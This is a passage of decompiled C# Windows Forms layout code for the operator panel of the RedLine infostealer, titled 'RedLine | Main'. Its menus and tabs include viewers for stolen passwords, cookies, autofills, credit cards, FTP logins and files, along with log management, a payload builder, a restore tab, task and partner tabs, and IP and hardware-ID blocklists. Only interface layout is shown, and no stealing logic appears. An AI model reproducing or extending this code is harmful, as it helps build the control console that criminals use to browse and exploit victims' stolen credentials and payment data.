		((System.Windows.Forms.ToolStripDropDownItem)this.viewersToolStripMenuItem).DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6]
		{
			(System.Windows.Forms.ToolStripItem)this.passwordsToolStripMenuItem,
			(System.Windows.Forms.ToolStripItem)this.cookiesToolStripMenuItem,
			(System.Windows.Forms.ToolStripItem)this.autofillsToolStripMenuItem,
			(System.Windows.Forms.ToolStripItem)this.creditCardsToolStripMenuItem,
			(System.Windows.Forms.ToolStripItem)this.fTPToolStripMenuItem,
			(System.Windows.Forms.ToolStripItem)this.filesToolStripMenuItem
		});
		((System.Windows.Forms.ToolStripItem)this.viewersToolStripMenuItem).Name = "viewersToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.viewersToolStripMenuItem).Size = new System.Drawing.Size(190, 22);
		((System.Windows.Forms.ToolStripItem)this.viewersToolStripMenuItem).Text = "Viewers";
		((System.Windows.Forms.ToolStripItem)this.passwordsToolStripMenuItem).Name = "passwordsToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.passwordsToolStripMenuItem).Size = new System.Drawing.Size(139, 22);
		((System.Windows.Forms.ToolStripItem)this.passwordsToolStripMenuItem).Text = "Passwords";
		((System.Windows.Forms.ToolStripItem)this.passwordsToolStripMenuItem).Click += new System.EventHandler(passwordsToolStripMenuItem_Click);
		((System.Windows.Forms.ToolStripItem)this.cookiesToolStripMenuItem).Name = "cookiesToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.cookiesToolStripMenuItem).Size = new System.Drawing.Size(139, 22);
		((System.Windows.Forms.ToolStripItem)this.cookiesToolStripMenuItem).Text = "Cookies";
		((System.Windows.Forms.ToolStripItem)this.cookiesToolStripMenuItem).Click += new System.EventHandler(cookiesToolStripMenuItem_Click);
		((System.Windows.Forms.ToolStripItem)this.autofillsToolStripMenuItem).Name = "autofillsToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.autofillsToolStripMenuItem).Size = new System.Drawing.Size(139, 22);
		((System.Windows.Forms.ToolStripItem)this.autofillsToolStripMenuItem).Text = "Autofills";
		((System.Windows.Forms.ToolStripItem)this.autofillsToolStripMenuItem).Click += new System.EventHandler(autofillsToolStripMenuItem_Click);
		((System.Windows.Forms.ToolStripItem)this.creditCardsToolStripMenuItem).Name = "creditCardsToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.creditCardsToolStripMenuItem).Size = new System.Drawing.Size(139, 22);
		((System.Windows.Forms.ToolStripItem)this.creditCardsToolStripMenuItem).Text = "Credit Cards";
		((System.Windows.Forms.ToolStripItem)this.creditCardsToolStripMenuItem).Click += new System.EventHandler(creditCardsToolStripMenuItem_Click);
		((System.Windows.Forms.ToolStripItem)this.fTPToolStripMenuItem).Name = "fTPToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.fTPToolStripMenuItem).Size = new System.Drawing.Size(139, 22);
		((System.Windows.Forms.ToolStripItem)this.fTPToolStripMenuItem).Text = "FTP";
		((System.Windows.Forms.ToolStripItem)this.fTPToolStripMenuItem).Click += new System.EventHandler(fTPToolStripMenuItem_Click);
		((System.Windows.Forms.ToolStripItem)this.filesToolStripMenuItem).Name = "filesToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.filesToolStripMenuItem).Size = new System.Drawing.Size(139, 22);
		((System.Windows.Forms.ToolStripItem)this.filesToolStripMenuItem).Text = "Files";
		((System.Windows.Forms.ToolStripItem)this.filesToolStripMenuItem).Click += new System.EventHandler(filesToolStripMenuItem_Click);
		((System.Windows.Forms.ToolStripItem)this.saveToolStripMenuItem).Name = "saveToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.saveToolStripMenuItem).Size = new System.Drawing.Size(190, 22);
		((System.Windows.Forms.ToolStripItem)this.saveToolStripMenuItem).Text = "Save";
		((System.Windows.Forms.ToolStripItem)this.saveToolStripMenuItem).Click += new System.EventHandler(saveToolStripMenuItem_Click);
		((System.Windows.Forms.ToolStripItem)this.db).Name = "runtimeExceptionToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.db).Size = new System.Drawing.Size(190, 22);
		((System.Windows.Forms.ToolStripItem)this.db).Text = "Runtime Exceptions";
		((System.Windows.Forms.ToolStripItem)this.db).Click += new System.EventHandler(db_Click);
		((System.Windows.Forms.ToolStripItem)this.blockIptoolStripMenuItem).Name = "blockIptoolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.blockIptoolStripMenuItem).Size = new System.Drawing.Size(190, 22);
		((System.Windows.Forms.ToolStripItem)this.blockIptoolStripMenuItem).Text = "Block IP";
		((System.Windows.Forms.ToolStripItem)this.blockIptoolStripMenuItem).Click += new System.EventHandler(blockIptoolStripMenuItem_Click);
		((System.Windows.Forms.ToolStripItem)this.blockHwidtoolStripMenuItem8).Name = "blockHwidtoolStripMenuItem8";
		((System.Windows.Forms.ToolStripItem)this.blockHwidtoolStripMenuItem8).Size = new System.Drawing.Size(190, 22);
		((System.Windows.Forms.ToolStripItem)this.blockHwidtoolStripMenuItem8).Text = "Block HWID";
		((System.Windows.Forms.ToolStripItem)this.blockHwidtoolStripMenuItem8).Click += new System.EventHandler(blockHwidtoolStripMenuItem8_Click);
		((System.Windows.Forms.ToolStripItem)this.showDomainDetects).Name = "showDomainDetects";
		((System.Windows.Forms.ToolStripItem)this.showDomainDetects).Size = new System.Drawing.Size(190, 22);
		((System.Windows.Forms.ToolStripItem)this.showDomainDetects).Text = "Show Domain Detects";
		((System.Windows.Forms.ToolStripItem)this.showDomainDetects).Click += new System.EventHandler(showDomainDetects_Click);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem6).Name = "toolStripMenuItem6";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem6).Size = new System.Drawing.Size(190, 22);
		((System.Windows.Forms.ToolStripItem)this.ca).Name = "deleteToolStripMenuItem1";
		((System.Windows.Forms.ToolStripItem)this.ca).Size = new System.Drawing.Size(190, 22);
		((System.Windows.Forms.ToolStripItem)this.ca).Text = "Delete";
		((System.Windows.Forms.ToolStripItem)this.ca).Click += new System.EventHandler(ca_Click);
		((System.Windows.Forms.ToolStrip)this.e0).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.e1 });
		((System.Windows.Forms.Control)this.e0).Name = "blackListCms";
		((System.Windows.Forms.Control)this.e0).Size = new System.Drawing.Size(108, 26);
		((System.Windows.Forms.ToolStripDropDown)this.e0).Opening += new System.ComponentModel.CancelEventHandler(e0_Opening);
		((System.Windows.Forms.ToolStripItem)this.e1).Name = "toolStripMenuItem3";
		((System.Windows.Forms.ToolStripItem)this.e1).Size = new System.Drawing.Size(107, 22);
		((System.Windows.Forms.ToolStripItem)this.e1).Text = "Delete";
		((System.Windows.Forms.ToolStripItem)this.e1).Click += new System.EventHandler(e1_Click);
		((System.Windows.Forms.ToolStrip)this.d8).Items.AddRange(new System.Windows.Forms.ToolStripItem[2]
		{
			(System.Windows.Forms.ToolStripItem)this.toolStripMenuItem7,
			(System.Windows.Forms.ToolStripItem)this.d9
		});
		((System.Windows.Forms.Control)this.d8).Name = "blackListCms";
		((System.Windows.Forms.Control)this.d8).Size = new System.Drawing.Size(108, 48);
		((System.Windows.Forms.ToolStripDropDown)this.d8).Opening += new System.ComponentModel.CancelEventHandler(d8_Opening);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem7).Name = "toolStripMenuItem7";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem7).Size = new System.Drawing.Size(107, 22);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem7).Text = "Edit";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem7).Click += new System.EventHandler(toolStripMenuItem7_Click);
		((System.Windows.Forms.ToolStripItem)this.d9).Name = "toolStripMenuItem2";
		((System.Windows.Forms.ToolStripItem)this.d9).Size = new System.Drawing.Size(107, 22);
		((System.Windows.Forms.ToolStripItem)this.d9).Text = "Delete";
		((System.Windows.Forms.ToolStripItem)this.d9).Click += new System.EventHandler(d9_Click);
		((System.Windows.Forms.ToolStrip)this.blackListCms_2).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem });
		((System.Windows.Forms.Control)this.blackListCms_2).Name = "blackListCms";
		((System.Windows.Forms.Control)this.blackListCms_2).Size = new System.Drawing.Size(108, 26);
		((System.Windows.Forms.ToolStripDropDown)this.blackListCms_2).Opening += new System.ComponentModel.CancelEventHandler(blackListCms_2_Opening);
		((System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem).Name = "deleteToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem).Size = new System.Drawing.Size(107, 22);
		((System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem).Text = "Delete";
		((System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem).Click += new System.EventHandler(deleteToolStripMenuItem_Click);
		((System.Windows.Forms.ToolStrip)this.blackListCms_3).Items.AddRange(new System.Windows.Forms.ToolStripItem[2]
		{
			(System.Windows.Forms.ToolStripItem)this.editToolStripMenuItem,
			(System.Windows.Forms.ToolStripItem)this.toolStripMenuItem1
		});
		((System.Windows.Forms.Control)this.blackListCms_3).Name = "blackListCms";
		((System.Windows.Forms.Control)this.blackListCms_3).Size = new System.Drawing.Size(108, 48);
		((System.Windows.Forms.ToolStripDropDown)this.blackListCms_3).Opening += new System.ComponentModel.CancelEventHandler(blackListCms_3_Opening);
		((System.Windows.Forms.ToolStripItem)this.editToolStripMenuItem).Name = "editToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.editToolStripMenuItem).Size = new System.Drawing.Size(107, 22);
		((System.Windows.Forms.ToolStripItem)this.editToolStripMenuItem).Text = "Edit";
		((System.Windows.Forms.ToolStripItem)this.editToolStripMenuItem).Click += new System.EventHandler(editToolStripMenuItem_Click);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem1).Name = "toolStripMenuItem1";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem1).Size = new System.Drawing.Size(107, 22);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem1).Text = "Delete";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem1).Click += new System.EventHandler(toolStripMenuItem1_Click);
		((System.Windows.Forms.Control)this.topHeader).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.lockBtn);
		((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.bf);
		((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.mainTitle);
		((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.closeBtn);
		((System.Windows.Forms.Control)this.topHeader).Dock = System.Windows.Forms.DockStyle.Top;
		((System.Windows.Forms.Control)this.topHeader).ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.Control)this.topHeader).Location = new System.Drawing.Point(0, 0);
		((System.Windows.Forms.Control)this.topHeader).Name = "topHeader";
		((System.Windows.Forms.Control)this.topHeader).Size = new System.Drawing.Size(1366, 30);
		((System.Windows.Forms.Control)this.topHeader).TabIndex = 1;
		((System.Windows.Forms.Control)this.topHeader).Paint += new System.Windows.Forms.PaintEventHandler(topHeader_Paint);
		((MetroSetButton)this.lockBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.lockBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.lockBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.lockBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.lockBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.lockBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.lockBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.lockBtn).Location = new System.Drawing.Point(1272, 3);
		((System.Windows.Forms.Control)this.lockBtn).Name = "lockBtn";
		((MetroSetButton)this.lockBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.lockBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.lockBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.lockBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.lockBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.lockBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.lockBtn).Size = new System.Drawing.Size(39, 23);
		((MetroSetButton)this.lockBtn).Style = (Style)0;
		((MetroSetButton)this.lockBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.lockBtn).TabIndex = 37;
		((System.Windows.Forms.Control)this.lockBtn).Text = "Lock";
		((MetroSetButton)this.lockBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.lockBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.lockBtn).Click += new System.EventHandler(lockBtn_Click);
		((System.Windows.Forms.Control)this.bf).AutoSize = true;
		((System.Windows.Forms.Control)this.bf).Font = new System.Drawing.Font("Segoe UI Semibold", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.bf).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.bf).Location = new System.Drawing.Point(1316, 3);
		((System.Windows.Forms.Control)this.bf).Name = "minimizeBtn";
		((System.Windows.Forms.Control)this.bf).Size = new System.Drawing.Size(21, 21);
		((System.Windows.Forms.Control)this.bf).TabIndex = 3;
		((System.Windows.Forms.Control)this.bf).Text = " _";
		((System.Windows.Forms.Control)this.bf).Click += new System.EventHandler(bf_Click);
		((System.Windows.Forms.Control)this.mainTitle).AutoSize = true;
		((System.Windows.Forms.Control)this.mainTitle).Font = new System.Drawing.Font("Segoe UI", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.mainTitle).ForeColor = System.Drawing.Color.Red;
		((System.Windows.Forms.Control)this.mainTitle).Location = new System.Drawing.Point(3, 4);
		((System.Windows.Forms.Control)this.mainTitle).Name = "mainTitle";
		((System.Windows.Forms.Control)this.mainTitle).Size = new System.Drawing.Size(107, 20);
		((System.Windows.Forms.Control)this.mainTitle).TabIndex = 2;
		((System.Windows.Forms.Control)this.mainTitle).Text = "RedLine | Main";
		((System.Windows.Forms.Control)this.closeBtn).AutoSize = true;
		((System.Windows.Forms.Control)this.closeBtn).Font = new System.Drawing.Font("Segoe UI Semibold", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.closeBtn).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.closeBtn).Location = new System.Drawing.Point(1343, 3);
		((System.Windows.Forms.Control)this.closeBtn).Name = "closeBtn";
		((System.Windows.Forms.Control)this.closeBtn).Size = new System.Drawing.Size(20, 21);
		((System.Windows.Forms.Control)this.closeBtn).TabIndex = 1;
		((System.Windows.Forms.Control)this.closeBtn).Text = "X";
		((System.Windows.Forms.Control)this.closeBtn).Click += new System.EventHandler(closeBtn_Click);
		((System.Windows.Forms.ToolStrip)this.blackListCms_4).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.toolStripMenuItem5 });
		((System.Windows.Forms.Control)this.blackListCms_4).Name = "blackListCms";
		((System.Windows.Forms.Control)this.blackListCms_4).Size = new System.Drawing.Size(108, 26);
		((System.Windows.Forms.ToolStripDropDown)this.blackListCms_4).Opening += new System.ComponentModel.CancelEventHandler(blackListCms_4_Opening);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem5).Name = "toolStripMenuItem5";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem5).Size = new System.Drawing.Size(107, 22);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem5).Text = "Delete";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem5).Click += new System.EventHandler(toolStripMenuItem5_Click);
		((System.Windows.Forms.ToolStrip)this.blackListCms_5).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.toolStripMenuItem4 });
		((System.Windows.Forms.Control)this.blackListCms_5).Name = "blackListCms";
		((System.Windows.Forms.Control)this.blackListCms_5).Size = new System.Drawing.Size(108, 26);
		((System.Windows.Forms.ToolStripDropDown)this.blackListCms_5).Opening += new System.ComponentModel.CancelEventHandler(blackListCms_5_Opening);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem4).Name = "toolStripMenuItem4";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem4).Size = new System.Drawing.Size(107, 22);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem4).Text = "Delete";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem4).Click += new System.EventHandler(toolStripMenuItem4_Click);
		((System.Windows.Forms.NotifyIcon)this.object_15).BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info;
		((System.Windows.Forms.NotifyIcon)this.object_15).BalloonTipText = "Application is minimized. Right click on icon to show context menu.";
		((System.Windows.Forms.NotifyIcon)this.object_15).BalloonTipTitle = "RedLine Application";
		((System.Windows.Forms.NotifyIcon)this.object_15).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.trayCms;
		((System.Windows.Forms.NotifyIcon)this.object_15).Icon = (System.Drawing.Icon)resources.GetObject("appTray.Icon");
		((System.Windows.Forms.NotifyIcon)this.object_15).Text = "RedLine Application";
		((System.Windows.Forms.ToolStrip)this.trayCms).Items.AddRange(new System.Windows.Forms.ToolStripItem[2]
		{
			(System.Windows.Forms.ToolStripItem)this.showToolStripMenuItem,
			(System.Windows.Forms.ToolStripItem)this.exitToolStripMenuItem
		});
		((System.Windows.Forms.Control)this.trayCms).Name = "trayCms";
		((System.Windows.Forms.Control)this.trayCms).Size = new System.Drawing.Size(104, 48);
		((System.Windows.Forms.ToolStripItem)this.showToolStripMenuItem).Name = "showToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.showToolStripMenuItem).Size = new System.Drawing.Size(103, 22);
		((System.Windows.Forms.ToolStripItem)this.showToolStripMenuItem).Text = "Show";
		((System.Windows.Forms.ToolStripItem)this.showToolStripMenuItem).Click += new System.EventHandler(showToolStripMenuItem_Click);
		((System.Windows.Forms.ToolStripItem)this.exitToolStripMenuItem).Name = "exitToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.exitToolStripMenuItem).Size = new System.Drawing.Size(103, 22);
		((System.Windows.Forms.ToolStripItem)this.exitToolStripMenuItem).Text = "Exit";
		((System.Windows.Forms.ToolStripItem)this.exitToolStripMenuItem).Click += new System.EventHandler(exitToolStripMenuItem_Click);
		((MetroSetToolTip)this.object_16).BackColor = System.Drawing.Color.White;
		((MetroSetToolTip)this.object_16).BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
		((MetroSetToolTip)this.object_16).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((MetroSetToolTip)this.object_16).OwnerDraw = true;
		((MetroSetToolTip)this.object_16).Style = (Style)0;
		((MetroSetToolTip)this.object_16).StyleManager = null;
		((MetroSetToolTip)this.object_16).ThemeAuthor = "Narwin";
		((MetroSetToolTip)this.object_16).ThemeName = "MetroLite";
		((System.Windows.Forms.ToolStrip)this.blackListCms_6).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.toolStripMenuItem8 });
		((System.Windows.Forms.Control)this.blackListCms_6).Name = "blackListCms";
		((System.Windows.Forms.Control)this.blackListCms_6).Size = new System.Drawing.Size(108, 26);
		((System.Windows.Forms.ToolStripDropDown)this.blackListCms_6).Opening += new System.ComponentModel.CancelEventHandler(blackListCms_6_Opening);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem8).Name = "toolStripMenuItem8";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem8).Size = new System.Drawing.Size(107, 22);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem8).Text = "Delete";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem8).Click += new System.EventHandler(toolStripMenuItem8_Click);
		((System.Windows.Forms.ToolStrip)this.blackListCms_7).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.toolStripMenuItem9 });
		((System.Windows.Forms.Control)this.blackListCms_7).Name = "blackListCms";
		((System.Windows.Forms.Control)this.blackListCms_7).Size = new System.Drawing.Size(108, 26);
		((System.Windows.Forms.ToolStripDropDown)this.blackListCms_7).Opening += new System.ComponentModel.CancelEventHandler(blackListCms_7_Opening);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem9).Name = "toolStripMenuItem9";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem9).Size = new System.Drawing.Size(107, 22);
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem9).Text = "Delete";
		((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem9).Click += new System.EventHandler(toolStripMenuItem9_Click);
		((System.Windows.Forms.TabControl)this.dashboardTabs).Alignment = System.Windows.Forms.TabAlignment.Left;
		((System.Windows.Forms.Control)this.dashboardTabs).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.logsTab);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.statisticTab);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.partnersTab);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.fc);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.tasksTab);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.sorterTab);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.dd);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.builderTab);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.restoreTab);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.m_ac);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.f2);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.notificationTab);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.blackListsTab);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.settingsTab);
		((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.contactsTab);
		((System.Windows.Forms.TabControl)this.dashboardTabs).ItemSize = new System.Drawing.Size(40, 190);
		((System.Windows.Forms.Control)this.dashboardTabs).Location = new System.Drawing.Point(0, 27);
		((System.Windows.Forms.TabControl)this.dashboardTabs).Multiline = true;
		((System.Windows.Forms.Control)this.dashboardTabs).Name = "dashboardTabs";
		((System.Windows.Forms.TabControl)this.dashboardTabs).SelectedIndex = 0;
		((System.Windows.Forms.Control)this.dashboardTabs).Size = new System.Drawing.Size(1366, 647);
		((System.Windows.Forms.TabControl)this.dashboardTabs).SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
		((System.Windows.Forms.Control)this.dashboardTabs).TabIndex = 0;
		((RedLine.MainPanel.Data.UI.AetherTabControl)this.dashboardTabs).UpperText = false;
		((System.Windows.Forms.Control)this.logsTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.totalSelectedLogs);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.label50);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.totalLogs);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.label38);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.totalPages);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.totalPagesLbl);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.currentPage);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.currentPageLbl);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.pageNumberTb);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.goToPageBtn);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.backPageBtn);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.nextPageBtn);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.cb);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.cc);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.cd);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.clearBtn);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.saveBtn);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.setCommentBtn);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.commentTb);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.label1);
		((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.logsListView);
		((System.Windows.Forms.Control)this.logsTab).Font = new System.Drawing.Font("Segoe UI", 9f);
		((System.Windows.Forms.Control)this.logsTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.logsTab).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.logsTab).Name = "logsTab";
		((System.Windows.Forms.Control)this.logsTab).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.logsTab).TabIndex = 4;
		((System.Windows.Forms.Control)this.logsTab).Text = "Logs";
		((System.Windows.Forms.Control)this.totalSelectedLogs).AutoSize = true;
		((System.Windows.Forms.Control)this.totalSelectedLogs).Font = new System.Drawing.Font("Segoe UI", 8f);
		((System.Windows.Forms.Control)this.totalSelectedLogs).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.totalSelectedLogs).Location = new System.Drawing.Point(86, 3);
		((System.Windows.Forms.Control)this.totalSelectedLogs).Name = "totalSelectedLogs";
		((System.Windows.Forms.Control)this.totalSelectedLogs).Size = new System.Drawing.Size(13, 13);
		((System.Windows.Forms.Control)this.totalSelectedLogs).TabIndex = 113;
		((System.Windows.Forms.Control)this.totalSelectedLogs).Text = "0";
		((System.Windows.Forms.Label)this.totalSelectedLogs).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.label50).AutoSize = true;
		((System.Windows.Forms.Control)this.label50).Font = new System.Drawing.Font("Segoe UI", 8f);
		((System.Windows.Forms.Control)this.label50).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label50).Location = new System.Drawing.Point(3, 3);
		((System.Windows.Forms.Control)this.label50).Name = "label50";
		((System.Windows.Forms.Control)this.label50).Size = new System.Drawing.Size(78, 13);
		((System.Windows.Forms.Control)this.label50).TabIndex = 112;
		((System.Windows.Forms.Control)this.label50).Text = "Selected logs:";
		((System.Windows.Forms.Label)this.label50).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.totalLogs).AutoSize = true;
		((System.Windows.Forms.Control)this.totalLogs).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.totalLogs).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.totalLogs).Location = new System.Drawing.Point(128, 590);
		((System.Windows.Forms.Control)this.totalLogs).Name = "totalLogs";
		((System.Windows.Forms.Control)this.totalLogs).Size = new System.Drawing.Size(13, 15);
		((System.Windows.Forms.Control)this.totalLogs).TabIndex = 111;
		((System.Windows.Forms.Control)this.totalLogs).Text = "0";
		((System.Windows.Forms.Label)this.totalLogs).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.label38).AutoSize = true;
		((System.Windows.Forms.Control)this.label38).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label38).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label38).Location = new System.Drawing.Point(38, 590);
